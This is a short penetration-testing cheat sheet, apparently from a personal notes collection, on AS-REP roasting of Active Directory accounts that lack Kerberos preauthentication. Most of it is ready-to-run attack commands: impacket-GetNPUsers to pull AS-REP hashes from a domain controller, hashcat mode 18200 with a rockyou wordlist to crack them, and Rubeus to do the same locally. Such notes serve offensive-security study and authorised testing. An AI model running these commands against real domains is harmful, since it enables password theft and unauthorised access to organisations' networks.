# AS-REP Roasting

Targets user accounts in an Active Directory environment with the "Do not require Kerberos preauthentication" setting enabled. This allows us to target any known user without prior authentication.

Perform remotely with [GetNPUsers](../../14%20Impacket%20Tools/GetNPUsers.md)

```bash
impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

Perform locally with [Rubeus](../0%20Tools/Local/Rubeus.md)

```
.\Rubeus.exe asreproast /nowrap
```
